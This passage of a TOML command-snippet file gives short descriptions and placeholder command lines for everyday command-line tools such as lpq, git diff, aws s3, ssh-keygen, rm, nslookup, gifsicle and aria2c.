  description = "Show the queued jobs of all printers enforcing encryption"
  command = "lpq -a -E"
  output = ""

[[snippets]]
  description = "Show the queued jobs in a long format"
  command = "lpq -l"
  output = ""

[[snippets]]
  description = "Show the queued jobs of a specific printer or class"
  command = "lpq -P <destination[/instance]>"
  output = ""

[[snippets]]
  description = "Show the queued jobs once every n seconds until the queue is empty"
  command = "lpq +<interval>"
  output = ""

[[snippets]]
  description = "List all available serial ports"
  command = "pio device list"
  output = ""

[[snippets]]
  description = "List all available logical devices"
  command = "pio device list --logical"
  output = ""

[[snippets]]
  description = "Start an interactive device monitor"
  command = "pio device monitor"
  output = ""

[[snippets]]
  description = "Start an interactive device monitor and listen to a specific port"
  command = "pio device monitor --port </dev/ttyUSBX>"
  output = ""

[[snippets]]
  description = "Start an interactive device monitor and set a specific baud rate (defaults to 9600)"
  command = "pio device monitor --baud <57600>"
  output = ""

[[snippets]]
  description = "Start an interactive device monitor and set a specific EOL character (defaults to `CRLF`)"
  command = "pio device monitor --eol <CRLF|CR|LF>"
  output = ""

[[snippets]]
  description = "Go to the menu of the interactive device monitor"
  command = "<Ctrl> + T"
  output = ""

[[snippets]]
  description = "Show unstaged changes"
  command = "git diff"
  output = ""

[[snippets]]
  description = "Show all uncommitted changes (including staged ones)"
  command = "git diff HEAD"
  output = ""

[[snippets]]
  description = "Show only staged (added, but not yet committed) changes"
  command = "git diff --staged"
  output = ""

[[snippets]]
  description = "Show changes from all commits since a given date/time (a date expression, e.g. "1 week 2 days" or an ISO date)"
  command = "git diff 'HEAD@{3 months|weeks|days|hours|seconds ago}'"
  output = ""

[[snippets]]
  description = "Show only names of changed files since a given commit"
  command = "git diff --name-only <commit>"
  output = ""

[[snippets]]
  description = "Output a summary of file creations, renames and mode changes since a given commit"
  command = "git diff --summary <commit>"
  output = ""

[[snippets]]
  description = "Compare a single file between two branches or commits"
  command = "git diff <branch_1>..<branch_2> [--] <path/to/file>"
  output = ""

[[snippets]]
  description = "Compare different files from the current branch to other branch"
  command = "git diff <branch>:<path/to/file2> <path/to/file>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr hexdump"
  output = ""

[[snippets]]
  description = "Print which artifacts are published under a specific Maven group identifier"
  command = "cs complete-dep <group_id>"
  output = ""

[[snippets]]
  description = "List published library versions under a specific Maven group identifier and an artifact one"
  command = "cs complete-dep <group_id>:<artifact_id>"
  output = ""

[[snippets]]
  description = "Print which artifacts are pubblished under a given Maven groupId searching in the ivy2local"
  command = "cs complete-dep <group_id> --repository ivy2local"
  output = ""

[[snippets]]
  description = "List published artifacts under a Maven group identifier searching in a specific repository and credentials"
  command = "cs complete-dep <group_id>:<artifact_id> --repository <repository_url> --credentials <user>:<password>"
  output = ""

[[snippets]]
  description = "Copy a file from local to a specific bucket"
  command = "aws s3 cp <path/to/file> s3://<bucket_name>/<path/to/remote_file>"
  output = ""

[[snippets]]
  description = "Copy a specific S3 object into another bucket"
  command = "aws s3 cp s3://<bucket_name1>/<path/to/file> s3://<bucket_name2>/<path/to/target>"
  output = ""

[[snippets]]
  description = "Copy a specific S3 object into another bucket keeping the original name"
  command = "aws s3 cp s3://<bucket_name1>/<path/to/file> s3://<bucket_name2>"
  output = ""

[[snippets]]
  description = "Copy S3 objects to a local directory recursively"
  command = "aws s3 cp s3://<bucket_name> . --recursive"
  output = ""

[[snippets]]
  description = "Display help"
  command = "aws s3 cp help"
  output = ""

[[snippets]]
  description = "Extract classes and methods from an APK file"
  command = "dexdump <path/to/file.apk>"
  output = ""

[[snippets]]
  description = "Display header information of DEX files contained in an APK file"
  command = "dexdump -f <path/to/file.apk>"
  output = ""

[[snippets]]
  description = "Display the dis-assembled output of executable sections"
  command = "dexdump -d <path/to/file.apk>"
  output = ""

[[snippets]]
  description = "Output results to a file"
  command = "dexdump -o <path/to/file> <path/to/file.apk>"
  output = ""

[[snippets]]
  description = "Create a new MSK cluster"
  command = "aws kafka create-cluster --cluster-name <cluster_name> --broker-node-group-info instanceType=<instance_type>,clientSubnets=<subnet_id1 subnet_id2 ...> --kafka-version <version> --number-of-broker-nodes <number>"
  output = ""

[[snippets]]
  description = "Describe a MSK cluster"
  command = "aws kafka describe-cluster --cluster-arn <cluster_arn>"
  output = ""

[[snippets]]
  description = "List all MSK clusters in the current region"
  command = "aws kafka list-clusters"
  output = ""

[[snippets]]
  description = "Create a new MSK configuration"
  command = "aws kafka create-configuration --name <configuration_name> --server-properties file://<path/to/configuration_file.txt>"
  output = ""

[[snippets]]
  description = "Describe a MSK configuration"
  command = "aws kafka describe-configuration --arn <configuration_arn>"
  output = ""

[[snippets]]
  description = "List all MSK configurations in the current region"
  command = "aws kafka list-configurations"
  output = ""

[[snippets]]
  description = "Update the MSK cluster configuration"
  command = "aws kafka update-cluster-configuration --cluster-arn <cluster_arn> --configuration-info arn=<configuration_arn>,revision=<configuration_revision>"
  output = ""

[[snippets]]
  description = "Delete the MSK cluster"
  command = "aws kafka delete-cluster --cluster-arn <cluster_arn>"
  output = ""

[[snippets]]
  description = "List labels for the repository in the current directory"
  command = "gh label list"
  output = ""

[[snippets]]
  description = "View labels for the repository in the current directory in the default web browser"
  command = "gh label list --web"
  output = ""

[[snippets]]
  description = "Create a label with a specific name, description and color in hexadecimal format for the repository in the current directory"
  command = "gh label create <name> --description ""<description>"" --color <color_hex>"
  output = ""

[[snippets]]
  description = "Delete a label for the repository in the current directory, prompting for confirmation"
  command = "gh label delete <name>"
  output = ""

[[snippets]]
  description = "Update the name and description for a specific label for the repository in the current directory"
  command = "gh label edit <name> --name <new_name> --description ""<description>"""
  output = ""

[[snippets]]
  description = "Clone labels from a specific repository into the repository in the current directory"
  command = "gh label clone <owner>/<repository>"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "gh label <subcommand> --help"
  output = ""

[[snippets]]
  description = "Start the daemon with one or more [c]onfiguration files (read in order)"
  command = "babeld -c <path/to/ports.conf> -c <path/to/filters.conf> -c <path/to/interfaces.conf>"
  output = ""

[[snippets]]
  description = "[D]eamonize after startup"
  command = "babeld -D"
  output = ""

[[snippets]]
  description = "Specify a [C]onfiguration command"
  command = "babeld -C <'redistribute metric 256'>"
  output = ""

[[snippets]]
  description = "Specify on which interfaces to operate"
  command = "babeld <eth0> <eth1> <wlan0>"
  output = ""

[[snippets]]
  description = "Specific information about the Message Queue which has the ID 32768"
  command = "ipcs -qi 32768"
  output = ""

[[snippets]]
  description = "General information about all the IPC"
  command = "ipcs -a"
  output = ""

[[snippets]]
  description = "Remove specific files"
  command = "rm <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Remove specific files ignoring nonexistent ones"
  command = "rm -f <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Remove specific files interactively prompting before each removal"
  command = "rm -i <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Remove specific files printing info about each removal"
  command = "rm -v <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Remove specific files and directories recursively"
  command = "rm -r <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Issue a certificate using webroot mode"
  command = "acme.sh --issue --domain <example.com> --webroot </path/to/webroot>"
  output = ""

[[snippets]]
  description = "Issue a certificate for multiple domains using standalone mode using port 80"
  command = "acme.sh --issue --standalone --domain <example.com> --domain <www.example.com>"
  output = ""

[[snippets]]
  description = "Issue a certificate using standalone TLS mode using port 443"
  command = "acme.sh --issue --alpn --domain <example.com>"
  output = ""

[[snippets]]
  description = "Issue a certificate using a working Nginx configuration"
  command = "acme.sh --issue --nginx --domain <example.com>"
  output = ""

[[snippets]]
  description = "Issue a certificate using a working Apache configuration"
  command = "acme.sh --issue --apache --domain <example.com>"
  output = ""

[[snippets]]
  description = "Issue a wildcard (\*) certificate using an automatic DNS API mode"
  command = "acme.sh --issue --dns <dns_cf> --domain <*.example.com>"
  output = ""

[[snippets]]
  description = "Install certificate files into the specified locations (useful for automatic certificate renewal)"
  command = "acme.sh --install-cert -d <example.com> --key-file </path/to/example.com.key> --fullchain-file </path/to/example.com.cer> --reloadcmd <""systemctl force-reload nginx"">"
  output = ""

[[snippets]]
  description = "Advertise/Disable SSH on the host"
  command = "sudo tailscale up --ssh=<true|false>"
  output = ""

[[snippets]]
  description = "SSH to a specific host which has Tailscale-SSH enabled"
  command = "tailscale ssh <username>@<host>"
  output = ""

[[snippets]]
  description = "Find broken links on <https://example.com/>"
  command = "linkchecker <https://example.com/>"
  output = ""

[[snippets]]
  description = "Also check URLs that point to external domains"
  command = "linkchecker --check-extern <https://example.com/>"
  output = ""

[[snippets]]
  description = "Ignore URLs that match a specific regular expression"
  command = "linkchecker --ignore-url <regular_expression> <https://example.com/>"
  output = ""

[[snippets]]
  description = "Output results to a CSV file"
  command = "linkchecker --file-output <csv>/<path/to/file> <https://example.com/>"
  output = ""

[[snippets]]
  description = "Automatically commit any changes made to a file or directory"
  command = "gitwatch <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Automatically commit changes and push them to a remote repository"
  command = "gitwatch -r <remote_name> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Automatically commit changes and push them to a specific branch of a remote repository"
  command = "gitwatch -r <remote_name> -b <branch_name> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Serve an `index.html` file and reload on changes"
  command = "live-server"
  output = ""

[[snippets]]
  description = "Specify a port (default is 8080) from which to serve a file"
  command = "live-server --port=<8081>"
  output = ""

[[snippets]]
  description = "Specify a given file to serve"
  command = "live-server --open=<about.html>"
  output = ""

[[snippets]]
  description = "Proxy all requests for ROUTE to URL"
  command = "live-server --proxy=</>:<http:localhost:3000>"
  output = ""

[[snippets]]
  description = "Register the current directory as a workspace"
  command = "git bulk --addcurrent <workspace_name>"
  output = ""

[[snippets]]
  description = "Register a workspace for bulk operations"
  command = "git bulk --addworkspace <workspace_name> </absolute/path/to/repository>"
  output = ""

[[snippets]]
  description = "Clone a repository inside a specific directory then register the repository as a workspace"
  command = "git bulk --addworkspace <workspace_name> </absolute/path/to/parent_directory> --from <remote_repository_location>"
  output = ""

[[snippets]]
  description = "Clone repositories from a newline-separated list of remote locations then register them as workspaces"
  command = "git bulk --addworkspace <workspace-name> </path/to/root/directory> --from </path/to/file>"
  output = ""

[[snippets]]
  description = "List all registered workspaces"
  command = "git bulk --listall"
  output = ""

[[snippets]]
  description = "Run a Git command on the repositories of the current workspace"
  command = "git bulk <command> <command_arguments>"
  output = ""

[[snippets]]
  description = "Remove a specific workspace"
  command = "git bulk --removeworkspace <workspace_name>"
  output = ""

[[snippets]]
  description = "Remove all workspaces"
  command = "git bulk --purge"
  output = ""

[[snippets]]
  description = "Open a file"
  command = "more <path/to/file>"
  output = ""

[[snippets]]
  description = "Search case-[i]nsensitively when pressing "/""
  command = "more -i <path/to/file>"
  output = ""

[[snippets]]
  description = "Display a specific line"
  command = "more +<line_number> <path/to/file>"
  output = ""

[[snippets]]
  description = "Go to the next page"
  command = "<Space>"
  output = ""

[[snippets]]
  description = "Search for a string (press `n` to go to the next match)"
  command = "/<something>"
  output = ""

[[snippets]]
  description = "Exit"
  command = "q"
  output = ""

[[snippets]]
  description = "Display help about interactive commands"
  command = "h"
  output = ""

[[snippets]]
  description = "Format a file and print the result to `stdout`"
  command = "prettier <path/to/file>"
  output = ""

[[snippets]]
  description = "Check if a specific file has been formatted"
  command = "prettier --check <path/to/file>"
  output = ""

[[snippets]]
  description = "Run with a specific configuration file"
  command = "prettier --config <path/to/config_file> <path/to/file>"
  output = ""

[[snippets]]
  description = "Format a file or directory, replacing the original"
  command = "prettier --write <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Format files or directories recursively using single quotes and no trailing commas"
  command = "prettier --single-quote --trailing-comma <none> --write <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Format JavaScript and TypeScript files recursively, replacing the original"
  command = "prettier --write ""**/*.{js,jsx,ts,tsx}"""
  output = ""

[[snippets]]
  description = "Start a query TUI to search files in the current directory recursively (CTRL-Z for help)"
  command = "ugrep --query"
  output = ""

[[snippets]]
  description = "Search the current directory recursively for files containing a regex search pattern"
  command = "ugrep ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Search in a specific file or in all files in a specific directory, showing line numbers of matches"
  command = "ugrep --line-number ""<search_pattern>"" <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Search in all files in the current directory recursively and print the name of each matching file"
  command = "ugrep --files-with-matches ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Fuzzy search files with up to 3 extra, missing or mismatching characters in the pattern"
  command = "ugrep --fuzzy=<3> ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Also search compressed files, `zip` and `tar` archives recursively"
  command = "ugrep --decompress ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Search only files whose filenames match a specific glob pattern"
  command = "ugrep --glob=""<glob_pattern>"" ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Search only C++ source files (use `--file-type=list` to list all file types)"
  command = "ugrep --file-type=cpp ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Format an XML document and print to `stdout`"
  command = "xmlstarlet format <path/to/file.xml>"
  output = ""

[[snippets]]
  description = "XML document can also be piped from `stdin`"
  command = "<cat path/to/file.xml> | xmlstarlet format"
  output = ""

[[snippets]]
  description = "Print all nodes that match a given XPath"
  command = "xmlstarlet select --template --copy-of <xpath> <path/to/file.xml>"
  output = ""

[[snippets]]
  description = "Insert an attribute to all matching nodes, and print to `stdout` (source file is unchanged)"
  command = "xmlstarlet edit --insert <xpath> --type attr --name <attribute_name> --value <attribute_value> <path/to/file.xml>"
  output = ""

[[snippets]]
  description = "Update the value of all matching nodes in place (source file is changed)"
  command = "xmlstarlet edit --inplace --update <xpath> --value <new_value> <file.xml>"
  output = ""

[[snippets]]
  description = "Delete all matching nodes in place (source file is changed)"
  command = "xmlstarlet edit --inplace --delete <xpath> <file.xml>"
  output = ""

[[snippets]]
  description = "Escape or unescape special XML characters in a given string"
  command = "xmlstarlet [un]escape <string>"
  output = ""

[[snippets]]
  description = "List a given directory as XML (omit argument to list current directory)"
  command = "xmlstarlet ls <path/to/directory>"
  output = ""

[[snippets]]
  description = "Scan a project with configuration file in your project's root directory named `sonar-project.properties`"
  command = "sonar-scanner"
  output = ""

[[snippets]]
  description = "Scan a project using configuration file other than `sonar-project.properties`"
  command = "sonar-scanner -D<project.settings=myproject.properties>"
  output = ""

[[snippets]]
  description = "Print debugging information"
  command = "sonar-scanner -X"
  output = ""

[[snippets]]
  description = "Display help"
  command = "sonar-scanner -h"
  output = ""

[[snippets]]
  description = "Display general information about the FIDO2 application"
  command = "ykman fido info"
  output = ""

[[snippets]]
  description = "Change the FIDO pin"
  command = "ykman fido access change-pin"
  output = ""

[[snippets]]
  description = "List resident credentials stored on the YubiKey"
  command = "ykman fido credentials list"
  output = ""

[[snippets]]
  description = "Delete a resident credential from the YubiKey"
  command = "ykman fido credentials delete <id>"
  output = ""

[[snippets]]
  description = "List fingerprints stored on the YubiKey (requires a key with a fingerprint sensor)"
  command = "ykman fido fingerprints list"
  output = ""

[[snippets]]
  description = "Add a new fingerprint to the YubiKey"
  command = "ykman fido fingerprints add <name>"
  output = ""

[[snippets]]
  description = "Delete a fingerprint from the YubiKey"
  command = "ykman fido fingerprints delete <name>"
  output = ""

[[snippets]]
  description = "Wipe all FIDO credentials (you have to do this after exceeding the number of PIN retry attempts)"
  command = "ykman fido reset"
  output = ""

[[snippets]]
  description = "Install cookbook dependencies into a local repo"
  command = "berks install"
  output = ""

[[snippets]]
  description = "Update a specific cookbook and its dependencies"
  command = "berks update <cookbook>"
  output = ""

[[snippets]]
  description = "Upload a cookbook to the Chef server"
  command = "berks upload <cookbook>"
  output = ""

[[snippets]]
  description = "View the dependencies of a cookbook"
  command = "berks contingent <cookbook>"
  output = ""

[[snippets]]
  description = "Initialize code for use with `lando`"
  command = "lando init"
  output = ""

[[snippets]]
  description = "Print information about your app"
  command = "lando info"
  output = ""

[[snippets]]
  description = "Start your app"
  command = "lando start"
  output = ""

[[snippets]]
  description = "Stop your app"
  command = "lando stop"
  output = ""

[[snippets]]
  description = "Restart your app"
  command = "lando restart"
  output = ""

[[snippets]]
  description = "Rebuild your app from scratch, preserving data"
  command = "lando rebuild"
  output = ""

[[snippets]]
  description = "Display logs for your app"
  command = "lando logs"
  output = ""

[[snippets]]
  description = "Destroy your app"
  command = "lando destroy"
  output = ""

[[snippets]]
  description = "Start a bisect session on a commit range bounded by a known buggy commit, and a known clean (typically older) one"
  command = "git bisect start <bad_commit> <good_commit>"
  output = ""

[[snippets]]
  description = "For each commit that `git bisect` selects, mark it as "bad" or "good" after testing it for the issue"
  command = "git bisect <good|bad>"
  output = ""

[[snippets]]
  description = "After `git bisect` pinpoints the faulty commit, end the bisect session and return to the previous branch"
  command = "git bisect reset"
  output = ""

[[snippets]]
  description = "Skip a commit during a bisect (e.g. one that fails the tests due to a different issue)"
  command = "git bisect skip"
  output = ""

[[snippets]]
  description = "Display a log of what has been done so far"
  command = "git bisect log"
  output = ""

[[snippets]]
  description = "Convert a PPM image to text as specified by the given template"
  command = "ppmtoarbtxt <path/to/template> <path/to/image.ppm> > <path/to/output_file.txt>"
  output = ""

[[snippets]]
  description = "Convert a PPM image to text as specified by the given template, prepend the contents of the specified head template"
  command = "ppmtoarbtxt <path/to/template> -hd <path/to/head_template> <path/to/image.ppm> > <path/to/output_file.txt>"
  output = ""

[[snippets]]
  description = "Convert a PPM image to text as specified by the given template, append the contents of the specified tail template"
  command = "ppmtoarbtxt <path/to/template> -hd <path/to/tail_template> <path/to/image.ppm> > <path/to/output_file.txt>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "ppmtoarbtxt -version"
  output = ""

[[snippets]]
  description = "Set the default printer"
  command = "lpoptions -d <printer[/instance]>"
  output = ""

[[snippets]]
  description = "List printer-specific options of a specific printer"
  command = "lpoptions -d <printer> -l"
  output = ""

[[snippets]]
  description = "Set a new option on a specific printer"
  command = "lpoptions -d <printer> -o <option>"
  output = ""

[[snippets]]
  description = "Remove the options of a specific printer"
  command = "lpoptions -d <printer> -x"
  output = ""

[[snippets]]
  description = "Preview color scheme"
  command = "wal --preview <image.png>"
  output = ""

[[snippets]]
  description = "Create color scheme"
  command = "wal -i <image.png>"
  output = ""

[[snippets]]
  description = "Create a light color scheme"
  command = "wal -i <image.png> -l"
  output = ""

[[snippets]]
  description = "Skip setting the desktop wallpaper"
  command = "wal -i <image.png> -n"
  output = ""

[[snippets]]
  description = "Skip setting the terminal colors"
  command = "wal -i <image.png> -s"
  output = ""

[[snippets]]
  description = "Restore the previously generated color scheme and wallpaper"
  command = "wal -R"
  output = ""

[[snippets]]
  description = "Generate a key interactively"
  command = "ssh-keygen"
  output = ""

[[snippets]]
  description = "Generate an ed25519 key with 32 key derivation function rounds and save the key to a specific file"
  command = "ssh-keygen -t <ed25519> -a <32> -f <~/.ssh/filename>"
  output = ""

[[snippets]]
  description = "Generate an RSA 4096-bit key with email as a comment"
  command = "ssh-keygen -t <rsa> -b <4096> -C ""<comment|email>"""
  output = ""

[[snippets]]
  description = "Remove the keys of a host from the known_hosts file (useful when a known host has a new key)"
  command = "ssh-keygen -R <remote_host>"
  output = ""

[[snippets]]
  description = "Retrieve the fingerprint of a key in MD5 Hex"
  command = "ssh-keygen -l -E <md5> -f <~/.ssh/filename>"
  output = ""

[[snippets]]
  description = "Change the password of a key"
  command = "ssh-keygen -p -f <~/.ssh/filename>"
  output = ""

[[snippets]]
  description = "Change the type of the key format (for example from OPENSSH format to PEM), the file will be rewritten in-place"
  command = "ssh-keygen -p -N """" -m <PEM> -f <~/.ssh/OpenSSH_private_key>"
  output = ""

[[snippets]]
  description = "Retrieve public key from secret key"
  command = "ssh-keygen -y -f <~/.ssh/OpenSSH_private_key>"
  output = ""

[[snippets]]
  description = "Convert an SLD file to a PPM image"
  command = "sldtoppm <path/to/input.sld> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Compensate for non-square pixels by scaling the width of the image"
  command = "sldtoppm -adjust <path/to/input.sld> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "List the commands and the names of the expected events"
  command = "trap"
  output = ""

[[snippets]]
  description = "Execute a command when a signal is received"
  command = "trap 'echo ""Caught signal <SIGHUP>""' <HUP>"
  output = ""

[[snippets]]
  description = "Remove commands"
  command = "trap - <HUP> <INT>"
  output = ""

[[snippets]]
  description = "Pull from the "default" source path"
  command = "hg pull"
  output = ""

[[snippets]]
  description = "Pull from a specified source repository"
  command = "hg pull <path/to/source_repository>"
  output = ""

[[snippets]]
  description = "Update the local repository to the head of the remote"
  command = "hg pull --update"
  output = ""

[[snippets]]
  description = "Pull changes even when the remote repository is unrelated"
  command = "hg pull --force"
  output = ""

[[snippets]]
  description = "Specify a specific revision changeset to pull up to"
  command = "hg pull --rev <revision>"
  output = ""

[[snippets]]
  description = "Specify a specific branch to pull"
  command = "hg pull --branch <branch>"
  output = ""

[[snippets]]
  description = "Specify a specific bookmark to pull"
  command = "hg pull --bookmark <bookmark>"
  output = ""

[[snippets]]
  description = "Pause all tasks in the default group"
  command = "pueue pause"
  output = ""

[[snippets]]
  description = "Pause a running task"
  command = "pueue pause <task_id>"
  output = ""

[[snippets]]
  description = "Pause a running task and stop all its direct children"
  command = "pueue pause --children <task_id>"
  output = ""

[[snippets]]
  description = "Pause all tasks in a group and prevent it from starting new tasks"
  command = "pueue pause --group <group_name>"
  output = ""

[[snippets]]
  description = "Pause all tasks and prevent all groups from starting new tasks"
  command = "pueue pause --all"
  output = ""

[[snippets]]
  description = "Generate a transition between two PPM images ([f]irst and [l]ast) using the specified effect"
  command = "ppmfade -f <path/to/image1.ppm> -l <path/to/image2.ppm> -<mix|spread|shift|relief|oil|...>"
  output = ""

[[snippets]]
  description = "Generate a transition starting with the specified image and ending in a solid black image"
  command = "ppmfade -f <path/to/image.ppm> -<mix|spread|shift|relief|oil|...>"
  output = ""

[[snippets]]
  description = "Generate a transition starting with a solid black image and ending with the specified image"
  command = "ppmfade -l <path/to/image.ppm> -<mix|spread|shift|relief|oil|...>"
  output = ""

[[snippets]]
  description = "Store the resulting images in files named `base.NNNN.ppm` where `NNNN` is a increasing number"
  command = "ppmfade -f <path/to/image1.ppm> -l <path/to/image2.ppm> -<mix|spread|shift|relief|oil|...> -base <base>"
  output = ""

[[snippets]]
  description = "Print direct dependencies"
  command = "npm query ':root > *'"
  output = ""

[[snippets]]
  description = "Print all direct production/development dependencies"
  command = "npm query ':root > .<prod|dev>'"
  output = ""

[[snippets]]
  description = "Print dependencies with a specific name"
  command = "npm query '#<package>'"
  output = ""

[[snippets]]
  description = "Print dependencies with a specific name and within a semantic versioning range"
  command = "npm query #<package>@<semantic_version>"
  output = ""

[[snippets]]
  description = "Print dependencies which have no dependencies"
  command = "npm query ':empty'"
  output = ""

[[snippets]]
  description = "Find all dependencies with postinstall scripts and uninstall them"
  command = "npm query "":attr(scripts, [postinstall])"" | jq 'map(.name) | join(""\n"")' -r | xargs -I {} npm uninstall {}"
  output = ""

[[snippets]]
  description = "Find all Git dependencies and print which application requires them"
  command = "npm query "":type(git)"" | jq 'map(.name)' | xargs -I {} npm why {}"
  output = ""

[[snippets]]
  description = "Bring most recently suspended or running background job to foreground"
  command = "fg"
  output = ""

[[snippets]]
  description = "Bring a specific job to foreground"
  command = "fg %<job_id>"
  output = ""

[[snippets]]
  description = "Start the synchronization process"
  command = "isisdl"
  output = ""

[[snippets]]
  description = "Limit the download rate to 20 MiB/s and download with 5 threads"
  command = "isisdl --download-rate <20> --max-num-threads <5>"
  output = ""

[[snippets]]
  description = "Run the initialization configuration wizard"
  command = "isisdl --init"
  output = ""

[[snippets]]
  description = "Run the additional configuration wizard"
  command = "isisdl --config"
  output = ""

[[snippets]]
  description = "Initiate a full synchronization of the database and compute the checksum of every file"
  command = "isisdl --sync"
  output = ""

[[snippets]]
  description = "Start ffmpeg to compress downloaded videos"
  command = "isisdl --compress"
  output = ""

[[snippets]]
  description = "Create a new project using the default template"
  command = "spike new <project_name>"
  output = ""

[[snippets]]
  description = "Compile your project, watch for changes, and auto-reload the browser"
  command = "spike watch"
  output = ""

[[snippets]]
  description = "Compile your project once to the "public" directory"
  command = "spike compile"
  output = ""

[[snippets]]
  description = "Remove the output directory"
  command = "spike clean"
  output = ""

[[snippets]]
  description = "Optimize a GIF as a new file"
  command = "gifsicle <path/to/input.gif> --optimize=3 -o <path/to/output.gif>"
  output = ""

[[snippets]]
  description = "Use [b]atch mode (modify each given file in place) and unoptimize a GIF"
  command = "gifsicle -b <path/to/input.gif> --unoptimize"
  output = ""

[[snippets]]
  description = "Extract a frame from a GIF"
  command = "gifsicle <path/to/input.gif> '#<0>' > <path/to/first_frame.gif>"
  output = ""

[[snippets]]
  description = "Make a GIF animation from selected GIFs"
  command = "gifsicle <*.gif> --delay=<10> --loop > <path/to/output.gif>"
  output = ""

[[snippets]]
  description = "Reduce file size using lossy compression"
  command = "gifsicle -b <path/to/input.gif> --optimize=3 --lossy=<100> --colors=<16> --dither"
  output = ""

[[snippets]]
  description = "Delete the first 10 frames and all frames after frame 20 from a GIF"
  command = "gifsicle -b <path/to/input.gif> --delete '#<0-9>' '#<20->'"
  output = ""

[[snippets]]
  description = "Modify all frames by cropping them to a rectangle, changing their scale, flipping them, and rotating them"
  command = "gifsicle -b --crop <starting_x>,<starting_y>+<rect_width>x<rect_height> --scale <0.25> --flip-horizontal --rotate-<90|180|270> <path/to/input.gif>"
  output = ""

[[snippets]]
  description = "Display each line once"
  command = "sort <path/to/file> | uniq"
  output = ""

[[snippets]]
  description = "Display only unique lines"
  command = "sort <path/to/file> | uniq -u"
  output = ""

[[snippets]]
  description = "Display only duplicate lines"
  command = "sort <path/to/file> | uniq -d"
  output = ""

[[snippets]]
  description = "Display number of occurrences of each line along with that line"
  command = "sort <path/to/file> | uniq -c"
  output = ""

[[snippets]]
  description = "Display number of occurrences of each line, sorted by the most frequent"
  command = "sort <path/to/file> | uniq -c | sort -nr"
  output = ""

[[snippets]]
  description = "Print a balance report showing totals"
  command = "ledger balance --file <path/to/ledger.journal>"
  output = ""

[[snippets]]
  description = "List all postings in Expenses ordered by amount"
  command = "ledger register <expenses> --sorted <amount>"
  output = ""

[[snippets]]
  description = "Print total Expenses other than Drinks and Food"
  command = "ledger balance <Expenses> and not (<Drinks> or <Food>)"
  output = ""

[[snippets]]
  description = "Print a budget report"
  command = "ledger budget"
  output = ""

[[snippets]]
  description = "Print summary information about all the postings"
  command = "ledger stats"
  output = ""

[[snippets]]
  description = "Download a specific URI to a file"
  command = "aria2c ""<url>"""
  output = ""

[[snippets]]
  description = "Download a file from a URI with a specific output name"
  command = "aria2c --out=<path/to/file> ""<url>"""
  output = ""

[[snippets]]
  description = "Download multiple different files in parallel"
  command = "aria2c --force-sequential <false> ""<url1 url2 ...>"""
  output = ""

[[snippets]]
  description = "Download the same file from different mirrors and verify the checksum of the downloaded file"
  command = "aria2c --checksum=<sha-256>=<hash> ""<url1>"" ""<url2>"" ""<urlN>"""
  output = ""

[[snippets]]
  description = "Download the URIs listed in a file with a specific number of parallel downloads"
  command = "aria2c --input-file=<path/to/file> --max-concurrent-downloads=<number_of_downloads>"
  output = ""

[[snippets]]
  description = "Download with multiple connections"
  command = "aria2c --split=<number_of_connections> ""<url>"""
  output = ""

[[snippets]]
  description = "FTP download with username and password"
  command = "aria2c --ftp-user=<username> --ftp-passwd=<password> ""<url>"""
  output = ""

[[snippets]]
  description = "Limit download speed in bytes/s"
  command = "aria2c --max-download-limit=<speed> ""<url>"""
  output = ""

[[snippets]]
  description = "Read Akebas YUV bytes from the specified input file, convert them to a PPM image and store them in the specified output file"
  command = "yuvtoppm <width> <height> <path/to/input_file.yuv> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Display information about a project"
  command = "Projucer --status <path/to/project_file>"
  output = ""

[[snippets]]
  description = "Resave all files and resources in a project"
  command = "Projucer --resave <path/to/project_file>"
  output = ""

[[snippets]]
  description = "Update the version number in a project"
  command = "Projucer --set-version <version_number> <path/to/project_file>"
  output = ""

[[snippets]]
  description = "Generate a JUCE project from a PIP file"
  command = "Projucer --create-project-from-pip <path/to/PIP> <path/to/output>"
  output = ""

[[snippets]]
  description = "Remove all JUCE-style comments (`//=====`, `//-----` or `///////`)"
  command = "Projucer --tidy-divider-comments <path/to/target_folder>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "Projucer --help"
  output = ""

[[snippets]]
  description = "Query your system's default name server for an IP address (A record) of the domain"
  command = "nslookup <example.com>"
  output = ""

[[snippets]]
  description = "Query a given name server for a NS record of the domain"
  command = "nslookup -type=NS <example.com> <8.8.8.8>"
  output = ""

[[snippets]]
  description = "Query for a reverse lookup (PTR record) of an IP address"
  command = "nslookup -type=PTR <54.240.162.118>"
  output = ""

[[snippets]]
  description = "Query for ANY available records using TCP protocol"
  command = "nslookup -vc -type=ANY <example.com>"
  output = ""

[[snippets]]
  description = "Query a given name server for the whole zone file (zone transfer) of the domain using TCP protocol"
  command = "nslookup -vc -type=AXFR <example.com> <name_server>"
  output = ""

[[snippets]]
  description = "Query for a mail server (MX record) of the domain, showing details of the transaction"
  command = "nslookup -type=MX -debug <example.com>"
  output = ""

[[snippets]]
  description = "Query a given name server on a specific port number for a TXT record of the domain"
  command = "nslookup -port=<port_number> -type=TXT <example.com> <name_server>"
  output = ""

[[snippets]]
  description = "Start WordGrinder (loads a blank document by default)"
  command = "wordgrinder"
  output = ""

[[snippets]]
  description = "Open a given file"
  command = "wordgrinder <path/to/file>"
  output = ""

[[snippets]]
